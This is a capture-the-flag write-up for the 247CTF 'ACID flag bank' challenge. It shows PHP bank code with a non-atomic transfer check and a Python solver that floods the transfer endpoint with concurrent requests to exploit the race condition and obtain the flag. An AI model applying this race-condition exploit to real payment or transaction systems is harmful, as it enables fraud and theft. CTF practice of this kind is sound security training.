# ACID FLAG BANK [MODERATE]

## Description

> You can purchase a flag directly from the ACID flag bank, however there aren't enough funds in the entire bank to complete that transaction! Can you identify any vulnerabilities within the ACID flag bank which enable you to increase the total available funds?

## Source Code

<details><summary>Click here for source code in text format</summary>

```php
<?php
require_once('flag.php');

class ChallDB
{
    public function __construct($flag)
    {
        $this->pdo = new SQLite3('/tmp/users.db');
        $this->flag = $flag;
    }
 
    public function updateFunds($id, $funds)
    {
        $stmt = $this->pdo->prepare('update users set funds = :funds where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->bindValue(':funds', $funds, SQLITE3_INTEGER);
        return $stmt->execute();
    }

    public function resetFunds()
    {
        $this->updateFunds(1, 247);
        $this->updateFunds(2, 0);
        return "Funds updated!";
    }

    public function getFunds($id)
    {
        $stmt = $this->pdo->prepare('select funds from users where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        return $result->fetchArray(SQLITE3_ASSOC)['funds'];
    }

    public function validUser($id)
    {
        $stmt = $this->pdo->prepare('select count(*) as valid from users where id = :id');
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC);
        return $row['valid'] == true;
    }

    public function dumpUsers()
    {
        $result = $this->pdo->query("select id, funds from users");
        echo "<pre>";
        echo "ID FUNDS\n";
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            echo "{$row['id']}  {$row['funds']}\n";
        }
        echo "</pre>";
    }

    public function buyFlag($id)
    {
        if ($this->validUser($id) && $this->getFunds($id) > 247) {
            return $this->flag;
        } else {
            return "Insufficient funds!";
        }
    }

    public function clean($x)
    {
        return round((int)trim($x));
    }
}

$db = new challDB($flag);
if (isset($_GET['dump'])) {
    $db->dumpUsers();
} elseif (isset($_GET['reset'])) {
    echo $db->resetFunds();
} elseif (isset($_GET['flag'], $_GET['from'])) {
    $from = $db->clean($_GET['from']);
    echo $db->buyFlag($from);
} elseif (isset($_GET['to'],$_GET['from'],$_GET['amount'])) {
    $to = $db->clean($_GET['to']);
    $from = $db->clean($_GET['from']);
    $amount = $db->clean($_GET['amount']);
    if ($to !== $from && $amount > 0 && $amount <= 247 && $db->validUser($to) && $db->validUser($from) && $db->getFunds($from) >= $amount) {
        $db->updateFunds($from, $db->getFunds($from) - $amount);
        $db->updateFunds($to, $db->getFunds($to) + $amount);
        echo "Funds transferred!";
    } else {
        echo "Invalid transfer request!";
    }
} else {
    echo highlight_file(__FILE__, true);
}
```

</details>

## Short Solution Description / Tags

Race Condition

## Solution

By Race Condition, increase the fund of the user with ID 2 to over 247 and get the flag.

solver.py

```python
import concurrent.futures
import re
import requests

requests.packages.urllib3.disable_warnings()


BASE_URL = "https://fbfce4182bc9250e.247ctf.com"

s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
s.verify = False


def exploit():
    s.get(f"{BASE_URL}/?reset=")

    send_transfer_request = lambda: s.get(f"{BASE_URL}/?from=1&to=2&amount=247")

    concurrency = 100
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
        [executor.submit(send_transfer_request) for _ in range(concurrency)]

    res = s.get(f"{BASE_URL}/?flag=&from=2")

    return res


def main():
    while True:
        res = exploit()
        if re.search(r"Insufficient funds!", res.text):
            continue

        print(res.text)
        break


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py
247CTF{[REDACTED]}
```
